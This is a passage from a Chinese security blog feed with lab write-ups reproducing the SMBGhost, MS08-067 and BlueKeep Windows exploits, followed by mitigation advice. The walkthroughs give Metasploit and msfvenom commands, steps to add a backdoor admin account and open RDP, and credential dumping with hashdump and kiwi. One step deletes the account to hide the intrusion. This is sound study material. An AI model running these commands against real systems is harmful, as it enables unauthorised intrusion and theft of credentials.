class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=1234 -f py -o smb.py</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.7.png" class="" title="生成payload"><p>将Payload里的<code>buf</code>变量更名为<code>USER_PAYLOAD</code>，再将RCE poc中的<code>exploit.py</code>中的<code>USER_PAYLOAD</code>的值更换成Payload中的值。</p><p>给<code>exploit.py</code>增加执行权限，执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit.py</span><br><span class="line">python3 exploit.py -ip 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.6.png" class="" title="运行exploit"><p>利用MSF开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.193.143</span><br><span class="line">set lport 1234</span><br><span class="line">show options#查看还有没有参数没有设置的</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>结果运行到这里一直卡住：</p><img src="/posts/df5ab46f/2.3.8.png" class="" title="运行卡住"><p><strong>不知道什么问题，运行了很多次仍然卡在这。</strong></p><p>实现远程登录后再通过本地提权，可以拿到靶机的管理员权限。</p><h1 id="3-防御方法"><a href="#3-防御方法" class="headerlink" title="3. 防御方法"></a>3. 防御方法</h1><ul><li><p>安装补丁。</p></li><li><p>根据BleepComputer的说法，尽管微软并未共享禁用SMBv3压缩的官方方法，但是Foregenix Solutions架构师Niall Newman在分析了Srv2.sys文件后可以通过手动修改注册表，防止被黑客远程攻击。</p><ul><li><p>在注册表“HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”建立一个名为<code>DisableCompression</code>的DWORD，值为1，禁止SMB的压缩功能。</p></li><li><p>或在管理员模式启动PowerShell，输入以下命令，执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure></li></ul></li><li><p>若无业务需要，在网络安全域边界防火墙封堵文件打印和共享端口TCP 135/139/445以缓解此问题。</p></li><li><p>可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞描述&quot;&gt;&lt;a href=&quot;#1-1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞描述&quot;&gt;&lt;/a&gt;1.1 漏洞描述&lt;/h2&gt;&lt;p&gt;CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS08-067漏洞复现及防御机制</title>
    <link href="http://example.com/posts/fa648f2b.html"/>
    <id>http://example.com/posts/fa648f2b.html</id>
    <published>2022-05-25T01:02:44.954Z</published>
    <updated>2022-05-28T00:30:27.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</p><span id="more"></span><p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的<code>NetPathCanonicalize()</code>函数时触发的。<code>NetPathCanonicalize()</code>函数在远程访问其它主机时，会调用<code>NetpwPathCanonicalize()</code>函数，对远程访问的路径进行规范化，而在<code>NetpwPathCanonicalize()</code>函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p><p>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。</p><p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p><p>详细请看：</p><p><a href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a> </p><p><a href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></p><p><a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>它影响了某些旧版本的Windows系统，包括：Windows 2000 、Windows XP 、Windows Server 2003。</p><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-常见的端口"><a href="#2-1-常见的端口" class="headerlink" title="2.1 常见的端口"></a>2.1 常见的端口</h2><img src="/posts/fa648f2b/2.1.1.jpg" class="" title="常见的端口"><p>黑客通过端口可以做信息收集、目标探测、服务判断、系统判断、角色分析。</p><h2 id="2-2-445端口"><a href="#2-2-445端口" class="headerlink" title="2.2 445端口"></a>2.2 445端口</h2><p>135、137、138、139和445端口都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p><p>445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p><p>总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest 帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p><p>利用工具：MSF</p><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>打开Windows Server 2003，确定445端口开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/2.2.1.png" class="" title="查看是否开启445端口"><p>关闭Win 2003系统的防火墙：</p><img src="/posts/fa648f2b/2.2.2.png" class="" title="关闭系统防火墙"><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>利用nmap扫描靶机的端口及确认该漏洞是否存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -p 445 --script smb-vuln-ms08-067 192.168.193.132 --open</span><br></pre></td></tr></table></figure><ul><li>-n：不要进行DNS解析</li><li>-p：后接端口号</li><li>—script：使用脚本进行扫描</li><li>—open：仅显示打开（或可能打开）的端口</li></ul><p>nmap漏扫脚本目录默认为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示漏洞存在且可以利用。</p><img src="/posts/fa648f2b/3.3.1.png" class="" title="扫描目标靶机的端口及确认该漏洞是否存在"><p>当然，我们一开始肯定不知道这么多信息，还不会用这么长的命令，那我们可以先确定靶机开放的端口和版本号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.193.132</span><br></pre></td></tr></table></figure><ul><li>-sV：探测打开的端口以确定服务/版本信息</li><li>-Pn：将所有主机视为在线，也就是跳过主机发现</li></ul><img src="/posts/fa648f2b/3.3.2.png" class="" title="探测打开的端口以确定服务&#x2F;版本信息"><p>做安全行业的，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。要是实在不知道，那我们还可以查百度嘛。</p><p>进入MSF，搜索MS08-067，这些步骤都在 <a href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708</a> 都讲过，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08-067</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.3.png" class="" title="搜索MS08-067"><p>查找到一个漏洞利用模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">show targets</span><br></pre></td></tr></table></figure><p>查看选项，缺少rhosts，所以要设置靶机IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.193.132 </span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.4.png" class="" title="设置靶机IP"><p>查看目标，找到与靶机匹配的信息。刚才我们已经用nmap -sV知道靶机是Windows Server 2003系统，但还是不知道具体信息（<strong>所以这种情况怎么才能知道具体信息？</strong>）。由于我知道靶机是Win 2003 SP2的，所以直接选目标74，如果实在没有更多信息那设置为自动目标(0)就好。</p><img src="/posts/fa648f2b/3.3.7.png" class="" title="设置target"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 74</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.5.png" class="" title="成功提权"><p>成功控制住靶机。我们可以用Linux或Windows窗口命令查看靶机的基本信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig#查看IP地址</span><br><span class="line">pwd#查看当前所在位置</span><br><span class="line">sysinfo#查看操作系统信息</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.9.png" class="" title="成功提权"><img src="/posts/fa648f2b/3.3.10.png" class="" title="成功提权"><p>后来做了set target 0的实验，MSF会自动检测系统版本并选择目标，但它默认选择English版本，这可能是没有成功建立会话的原因之一。</p><img src="/posts/fa648f2b/3.3.16.png" class="" title="提权失败"><p>此时将它修改为74也不行了，提示我们“这很可能意味着先前的攻击尝试导致服务崩溃”。</p><img src="/posts/fa648f2b/3.3.17.png" class="" title="提权失败"><p>如果多run几次还会导致Win 2003系统内存溢出错误。</p><img src="/posts/fa648f2b/3.3.18.png" class="" title="内存溢出错误"><p>这种情况好像只能等靶机重新开机，才能利用前几次攻击失败的经验继续渗透。</p><h3 id="3-3-1-创建文件"><a href="#3-3-1-创建文件" class="headerlink" title="3.3.1 创建文件"></a>3.3.1 创建文件</h3><p>尝试在靶机上创建文件夹和文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hacker</span><br><span class="line">cd hacker</span><br><span class="line">shell#进入靶机命令窗口</span><br><span class="line">echo v5le0n9&gt;test.txt</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.6.png" class="" title="在靶机创建目录"><img src="/posts/fa648f2b/3.3.8.png" class="" title="在靶机创建目录"><h3 id="3-3-2-创建用户"><a href="#3-3-2-创建用户" class="headerlink" title="3.3.2 创建用户"></a>3.3.2 创建用户</h3><p>Windows DOM用户常用命令如下：</p><ul><li><strong>net user abcd 1234 /add</strong><br>新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</li><li><strong>net user abcd /del</strong><br>将用户名为abcd的用户删除</li><li><strong>net user abcd /active:no</strong><br>将用户名为abcd的用户禁用</li><li><strong>net user abcd /active:yes</strong><br>激活用户名为abcd的用户</li><li><strong>net user abcd</strong><br>查看用户名为abcd的用户的情况</li><li><strong>net localgroup administrators abcd /add</strong><br>将abcd账户给予管理员权限</li></ul><p>创建一个名为v5le0n9，密码为123456的普通用户，给予管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 123456 /add#增加普通用户</span><br><span class="line">net localgroup administrators v5le0n9 /add#提升管理员权限</span><br></pre></td></tr></table></figure><img src="/posts/fa648f2b/3.3.11.png" class="" title="提升管理员权限"><p>在Win 2003中能看到新创建了一个用户v5le0n9。</p><img src="/posts/fa648f2b/3.3.13.png" class="" title="提升管理员权限"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat# 开启远程连接</span><br><span class="line">netstat -an# 查看网络端口</span><br><span class="line">rdesktop 192.168.193.132# 远程连接</span><br></pre></td></tr></table></figure><p>开启远程连接3389端口，使用Kali远程登录靶机。</p><img src="/posts/fa648f2b/3.3.12.png" class="" title="开启远程连接3389端口"><p>最后一定要把我们新建的用户名删除，假装没来过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 /del</span><br></pre></td></tr></table></figure><p>虽然不能远程登录了，但靶机<code>C:\Documents and Settings</code>目录下还是有v5le0n9文件夹，<strong>怎么删不掉呢？！</strong></p><img src="/posts/fa648f2b/3.3.15.png" class="" title="删除用户名"><img src="/posts/fa648f2b/3.3.14.png" class="" title="删除用户名"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>关闭相关端口、安装杀毒软件和补丁</li><li>在防火墙中进行流量监测，主要是针对数据包中存在的形如“\ ** \ … \ … \ *”这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-漏洞背景&quot;&gt;&lt;a href=&quot;#1-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞背景&quot;&gt;&lt;/a&gt;1. 漏洞背景&lt;/h1&gt;&lt;h2 id=&quot;1-1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.1 漏洞概述&quot;&gt;&lt;/a&gt;1.1 漏洞概述&lt;/h2&gt;&lt;p&gt;MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708漏洞复现及防御机制</title>
    <link href="http://example.com/posts/2d03ac3f.html"/>
    <id>http://example.com/posts/2d03ac3f.html</id>
    <published>2022-05-24T07:28:42.637Z</published>
    <updated>2022-05-28T01:02:02.226Z</updated>
    
    <content type="html"><![CDATA[<p>终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。</p><span id="more"></span><h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的Windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年的 WannaCry 恶意软件的传播方式类似，成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>存在漏洞的远程桌面服务器，在接收到特殊数据包时会释放一个内部信道 MS_T120 的控制结构体，但并未将指向该结构体的指针删除，而且在远程桌面连接结束之后还会调用 MS_T120 结构体内的一个函数指针，若攻击者可通过远程发送数据重新占据被释放的 MS_T120，并为结构体内的函数指针赋恰当的值，即可实现远程命令执行。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>该漏洞影响旧版本的Windows系统，包括：Windows 7 、 Windows Server 2008 R2 、 Windows Server 2008 、Windows 2003 、 Windows XP。</p><p>Windows 8 和 Windows 10及之后版本不受此漏洞影响。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>CVE-2019-0708漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。如果被攻击者利用，会导致服务器被入侵，中病毒，像 WannaCry 永恒之蓝漏洞一样大规模的感染。若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-0708: 高危</span><br></pre></td></tr></table></figure><h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-RDP协议"><a href="#2-1-RDP协议" class="headerlink" title="2.1 RDP协议"></a>2.1 RDP协议</h2><p>远程显示协议(Remote Display Protocol，RDP)，提供了客户和服务器之间的连接。</p><p>RDP是微软终端服务应用的协议，服务端基于Win 2000 / Win NT。协议基于T.128（T.120协议族）提供多通道通信。在客户端支持多种资源缓冲和图片数据的压缩处理，运用RDP协议的虚拟化平台有VMware、Microsoft等。</p><p>终端服务使任何一台有权限的终端机，用已知的账号登录服务器，可以使用账号内的资源，包括软件，硬件资源；同时，在协议升级后，客户端连接后可以使用本地的资源，包括本地打印机、声音本地回放，本地磁盘资源和本地硬件接口。所有的计算都在服务器端进行，客户端只需要处理网络连接、接收数据、界面显示和设备数据输出。</p><h2 id="2-2-专业术语"><a href="#2-2-专业术语" class="headerlink" title="2.2 专业术语"></a>2.2 专业术语</h2><ul><li>POC(Proof of Concept)：观点证明，用来证明漏洞存在的。简单来说是用来证明一段漏洞的代码，它是无害的。</li><li>EXP(Exploit)：漏洞利用，是指利用系统漏洞进行攻击的动作。</li><li>Payload：有效载荷，指的是Exploit执行成功之后，在系统中进行恶意操作的代码或者指令。</li><li>Shellcode：简单翻译就是shell代码，是payload的一种，因为建立正反shell而得名。Shellcode是一段利用软件漏洞执行的代码，Shellcode为16进制的机器码， 可在寄存器eip溢出后，塞入一段让CPU执行的Shellcode机器码，让电脑可以执行攻击者的任意指令。</li></ul><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 7  x86 旗舰版（IP地址：192.168.193.140）、Windows 7  x64 企业版（IP地址：192.168.193.141）</p><p>利用工具：</p><ul><li>MSF</li><li>POC：<a href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></li></ul><h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>在靶机中设置远程桌面连接：</p><img src="/posts/2d03ac3f/2.2.1.png" class="" title="设置远程桌面连接"><p>开启公用文件夹共享：</p><img src="/posts/2d03ac3f/2.2.2.png" class="" title="开启公用文件夹共享"><p>在Windows 防火墙开启3389端口：</p><img src="/posts/2d03ac3f/2.2.3.png" class="" title="开启3389端口"><p>在攻击机中更新应用，安装MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><p>有关MSF的知识可以看<a href="https://blog.csdn.net/weixin_45677145/article/details/111540117">MSF详解</a>，Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p><h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>扫描靶机IP或扫描内网的存活主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.193.140</span><br><span class="line">nmap 192.168.193.0/24</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.4.png" class="" title="扫描靶机是否开启3389端口"><p>发现靶机开启了3389端口，猜测可以利用CVE-2019-0708进行攻击。进入MSF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.5.png" class="" title="进入MSF"><p>在MSF中搜索有关CVE-2019-0708的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve-2019-0708</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.7.png" class="" title="启用模块"><p>得到两个模块，一个是辅助模块，用来扫描靶机是否存在该漏洞且可利用；另一个是漏洞利用模块，用来攻击靶机。</p><p>先利用辅助模块对靶机进行扫描，查看相关信息和设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.6.png" class="" title="启用模块"><p>其中还有一个rhosts参数还没进行设置，将rhosts设置为靶机IP，进行检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.193.140</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞"><p>结果显示靶机存在这个漏洞。</p><h3 id="3-3-1-提权"><a href="#3-3-1-提权" class="headerlink" title="3.3.1 提权"></a>3.3.1 提权</h3><p>使用漏洞利用模块对靶机进行渗透：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">set rhosts 192.168.193.140</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.14.png" class="" title="使用攻击模块进行设置"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.15.png" class="" title="使用攻击模块进行设置"><p>发现目前的攻击脚本只适用于64位版本的 Windows 7 和 Windows 2008 R2 ，到了这里做不下去了，攻击不成功，因为我的 Win 7 靶机是32位的🤣。</p><img src="/posts/2d03ac3f/2.2.16.png" class="" title="使用攻击模块进行设置"><p>速速转到64位版本的 Win 7 重复以上操作，因为我的VMware是15.5的版本，所以选择5，成功提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.17.png" class="" title="成功提权"><h3 id="3-3-2-远程登录"><a href="#3-3-2-远程登录" class="headerlink" title="3.3.2 远程登录"></a>3.3.2 远程登录</h3><p>注意，这个操作在提权成功的情况下才能进行远程登录。将靶机用户设置密码，否则不能远程登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump//获取目标主机hash值</span><br><span class="line">load kiwi//载入kiwi模块，它是一个密码提取神器，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证等</span><br><span class="line">creds_all//获得目标主机的账号密码</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.2.png" class="" title="提取账户密码"><p>远程登录靶机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.193.141 -u Leong -p l30n9ry0n</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.3.png" class="" title="远程登录靶机"><h3 id="3-3-3-蓝屏攻击"><a href="#3-3-3-蓝屏攻击" class="headerlink" title="3.3.3 蓝屏攻击"></a>3.3.3 蓝屏攻击</h3><p>前情提要：使用辅助模块发现靶机存在这个漏洞。</p><p>安装pip3和impacket库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.9.png" class="" title="安装pip3和impacket库"><p>下载POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br></pre></td></tr></table></figure><p>进去该目录看看里面有什么文件以及它们的权限。发现它们没有执行权限。</p><img src="/posts/2d03ac3f/2.2.10.png" class="" title="POC包含的文件"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 crashpoc.py</span><br></pre></td></tr></table></figure><p>chmod表示change mod，修改文件属性；<code>crashpoc.py</code>表示所要修改的文件；777表示权限列表，每个“7”表示一组，共三组。“r—”二进制表示“100”，其值为4；而“rwx”表示“111”，其值为7，即所有权限都开启。</p><img src="/posts/2d03ac3f/2.2.12.png" class="" title="修改文件权限"><p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么要安装impacket库。可用<code>pip3 list</code>命令查看Python安装的所有扩展包。</p><img src="/posts/2d03ac3f/2.2.11.png" class=""><p>利用脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 crashpoc.py 192.168.193.140 32</span><br><span class="line">#IP地址 